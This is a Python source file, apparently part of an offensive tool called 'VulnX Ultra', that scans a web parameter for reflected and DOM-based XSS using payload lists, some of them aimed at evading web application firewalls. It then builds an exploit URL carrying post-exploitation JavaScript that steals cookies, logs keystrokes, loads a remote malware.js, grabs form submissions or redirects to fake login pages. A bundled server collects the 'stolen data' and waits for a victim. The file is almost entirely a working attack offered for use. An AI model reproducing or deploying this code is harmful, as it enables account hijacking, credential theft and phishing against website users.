#!/usr/bin/env python3
"""
XSS Exploitation Module for VulnX Ultra
"""

import os
import re
import json
import time
import random
import base64
import hashlib
import requests
import threading
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import track
from http.server import HTTPServer, SimpleHTTPRequestHandler
from bs4 import BeautifulSoup

console = Console()

# Payloads for different XSS types
XSS_PAYLOADS = {
    "basic": [
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">"
    ],
    "tag_breaking": [
        "\"><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        "</script><script>alert(1)</script>"
    ],
    "event_handlers": [
        "<input autofocus onfocus=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<body onload=alert(1)>"
    ],
    "javascript": [
        "javascript:alert(1)",
        "alert`1`",
        "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"
    ],
    "waf_bypass": [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<img src=x oneonerrorrror=alert(1)>",
        "<svg><script>alert&#40;1&#41</script>"
    ],
    "dom_based": [
        "#\"><script>alert(1)</script>",
        "#/test\"><img src=x onerror=alert(1)>",
        "javascript:eval(atob('YWxlcnQoMSk='))"  # alert(1) base64 encoded
    ]
}

# Post-exploitation payloads
POST_EXPLOITATION = {
    "cookie_stealer": "new Image().src=\"http://{SERVER}/steal?data=\"+encodeURIComponent(document.cookie);",
    "keylogger": "document.onkeypress=function(e){fetch(\"http://{SERVER}/log?key=\"+encodeURIComponent(e.key))};",
    "load_script": "var s=document.createElement('script');s.src='http://{SERVER}/malware.js';document.body.appendChild(s);",
    "redirect": "window.location.href=\"http://{SERVER}/phish\";",
    "form_grabbing": """
    var forms=document.getElementsByTagName('form');
    for(var i=0;i<forms.length;i++){
        forms[i].onsubmit=function(){
            var data=new FormData(this);
            fetch('http://{SERVER}/grab',{
                method:'POST',
                body:data
            });
        }
    }
    """
}

# Login page templates
LOGIN_PAGES = {
    "ar": """
    <!DOCTYPE html>
    <html dir="rtl" lang="ar">
    <head>
        <meta charset="UTF-8">
        <title>تسجيل الدخول</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #f5f5f5; text-align: center; padding: 50px; }
            .login-box { background: white; width: 300px; margin: 0 auto; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
            button { background: #4CAF50; color: white; border: none; padding: 10px; width: 100%; border-radius: 3px; cursor: pointer; }
            h2 { color: #333; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>تسجيل الدخول</h2>
            <form action="/login" method="POST">
                <input type="text" name="username" placeholder="اسم المستخدم" required>
                <input type="password" name="password" placeholder="كلمة المرور" required>
                <button type="submit">تسجيل الدخول</button>
            </form>
        </div>
    </body>
    </html>
    """,
    "en": """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #f5f5f5; text-align: center; padding: 50px; }
            .login-box { background: white; width: 300px; margin: 0 auto; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
            button { background: #4CAF50; color: white; border: none; padding: 10px; width: 100%; border-radius: 3px; cursor: pointer; }
            h2 { color: #333; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>Login</h2>
            <form action="/login" method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    """
}

class XSSExploiter:
    def __init__(self, url, param, method="GET", proxies=None, stealth=False, delay=0, output=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.proxies = proxies
        self.stealth = stealth
        self.delay = delay
        self.output = output
        self.vulnerable = False
        self.server = None
        self.server_thread = None
        self.server_port = random.randint(8000, 9000)
        self.stolen_data = []
        self.payloads_tested = []
        
    def start_server(self):
        """Start a local HTTP server for post-exploitation"""
        class RequestHandler(SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/steal':
                    length = int(self.headers.get('content-length', 0))
                    data = self.rfile.read(length).decode()
                    self.server.exploiter.log_stolen_data(data)
                    self.send_response(200)
                    self.end_headers()
                elif self.path == '/phish':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(LOGIN_PAGES["en"].encode())
                else:
                    super().do_GET()

            def do_POST(self):
                if self.path == '/grab':
                    length = int(self.headers.get('content-length', 0))
                    data = self.rfile.read(length).decode()
                    self.server.exploiter.log_stolen_data(data)
                    self.send_response(200)
                    self.end_headers()
                else:
                    super().do_POST()

        class CustomHTTPServer(HTTPServer):
            def __init__(self, *args, **kwargs):
                self.exploiter = self
                super().__init__(*args, **kwargs)

        os.chdir(os.path.dirname(os.path.abspath(__file__)))
        self.server = CustomHTTPServer(('0.0.0.0', self.server_port), RequestHandler)
        
        def run_server():
            self.server.serve_forever()
            
        self.server_thread = threading.Thread(target=run_server)
        self.server_thread.daemon = True
        self.server_thread.start()
        console.print(f"[green]✓ Started local server on port {self.server_port}[/green]")
        
    def stop_server(self):
        """Stop the local HTTP server"""
        if self.server:
            self.server.shutdown()
            self.server_thread.join()
            console.print("[yellow]✓ Stopped local server[/yellow]")
            
    def log_stolen_data(self, data):
        """Log stolen data to file and console"""
        self.stolen_data.append(data)
        console.print(f"[red]⚠ Stolen data: {data}[/red]")
        
        if self.output:
            with open(f"{self.output}_stolen_data.txt", "a") as f:
                f.write(f"{time.ctime()}: {data}\n")
    
    def test_payload(self, payload):
        """Test a single XSS payload"""
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            
            if self.stealth:
                time.sleep(self.delay + random.uniform(0, 1.5))
                headers.update({
                    "Referer": "https://www.google.com/",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5"
                })
            
            if self.method == "GET":
                if "?" in self.url:
                    test_url = f"{self.url}&{self.param}={payload}"
                else:
                    test_url = f"{self.url}?{self.param}={payload}"
                
                response = requests.get(test_url, headers=headers, proxies=self.proxies, timeout=10)
            else:
                test_url = self.url
                if self.method == "POST":
                    response = requests.post(test_url, data={self.param: payload}, headers=headers, 
                                           proxies=self.proxies, timeout=10)
                elif self.method == "PUT":
                    response = requests.put(test_url, data={self.param: payload}, headers=headers, 
                                          proxies=self.proxies, timeout=10)
            
            # Check if payload was reflected in response
            if payload in response.text:
                self.vulnerable = True
                return {
                    "payload": payload,
                    "url": test_url,
                    "type": "XSS",
                    "message": "Payload reflected in response - Possible XSS",
                    "status": response.status_code
                }
            
            # Check for DOM-based XSS indicators
            soup = BeautifulSoup(response.text, 'html.parser')
            scripts = soup.find_all('script')
            for script in scripts:
                if payload in str(script):
                    self.vulnerable = True
                    return {
                        "payload": payload,
                        "url": test_url,
                        "type": "DOM-based XSS",
                        "message": "Payload found in script - Possible DOM-based XSS",
                        "status": response.status_code
                    }
                    
            return None
            
        except Exception as e:
            console.print(f"[red]Error testing payload {payload}: {str(e)}[/red]")
            return None
    
    def test_all_payloads(self):
        """Test all XSS payloads"""
        results = []
        console.print("[yellow]Starting XSS payload testing...[/yellow]")
        
        for category, payloads in XSS_PAYLOADS.items():
            for payload in track(payloads, description=f"Testing {category} payloads..."):
                result = self.test_payload(payload)
                if result:
                    results.append(result)
                    self.payloads_tested.append(payload)
                    console.print(f"[red]✓ Vulnerable to {result['type']} with payload: {payload}[/red]")
        
        return results
    
    def generate_exploit_url(self, post_exploit_type="cookie_stealer"):
        """Generate exploit URL with post-exploitation payload"""
        if not self.vulnerable or not self.payloads_tested:
            console.print("[red]No successful payloads found to exploit[/red]")
            return None
            
        # Use the first successful payload
        payload = self.payloads_tested[0]
        
        # Add post-exploitation code
        post_exploit = POST_EXPLOITATION[post_exploit_type].replace(
            "{SERVER}", f"localhost:{self.server_port}"
        )
        
        # Encode the payload if needed
        if "javascript:" in payload:
            exploit_payload = payload + post_exploit
        else:
            exploit_payload = f"{payload}\n{post_exploit}"
            
        # URL encode the payload
        exploit_payload = requests.utils.quote(exploit_payload)
        
        if self.method == "GET":
            if "?" in self.url:
                return f"{self.url}&{self.param}={exploit_payload}"
            else:
                return f"{self.url}?{self.param}={exploit_payload}"
        else:
            return self.url  # For POST/PUT, we need to send the payload in the body
    
    def exploit(self, post_exploit_type="cookie_stealer"):
        """Main exploit method"""
        try:
            # Start local server for post-exploitation
            self.start_server()
            
            # Test all payloads
            results = self.test_all_payloads()
            
            if not self.vulnerable:
                console.print("[yellow]No XSS vulnerabilities found[/yellow]")
                return
            
            # Generate exploit URL
            exploit_url = self.generate_exploit_url(post_exploit_type)
            
            if not exploit_url:
                return
                
            console.print(Panel.fit(
                f"[bold red]XSS Exploit URL[/bold red]\n[green]{exploit_url}[/green]",
                title="Exploit"
            ))
            
            # Save results
            if self.output:
                self.save_results(results)
                
            console.print("[yellow]Waiting for victim to trigger the exploit...[/yellow]")
            console.print("[yellow]Press Ctrl+C to stop...[/yellow]")
            
            # Keep server running
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            console.print("[yellow]Stopping exploit...[/yellow]")
        finally:
            self.stop_server()
    
    def save_results(self, results):
        """Save scan results to file"""
        if not self.output:
            return
            
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        output_file = f"{self.output}_{timestamp}.json"
        
        try:
            with open(output_file, "w") as f:
                json.dump({
                    "url": self.url,
                    "parameter": self.param,
                    "method": self.method,
                    "vulnerable": self.vulnerable,
                    "results": results,
                    "exploit_url": self.generate_exploit_url(),
                    "stolen_data": self.stolen_data
                }, f, indent=4)
                
            console.print(f"[green]✓ Results saved to {output_file}[/green]")
        except Exception as e:
            console.print(f"[red]Error saving results: {str(e)}[/red]")

def main():
    """Example usage"""
    exploiter = XSSExploiter(
        url="http://example.com/vulnerable.php",
        param="search",
        method="GET"
    )
    
    exploiter.exploit(post_exploit_type="cookie_stealer")

if __name__ == "__main__":
    main()
    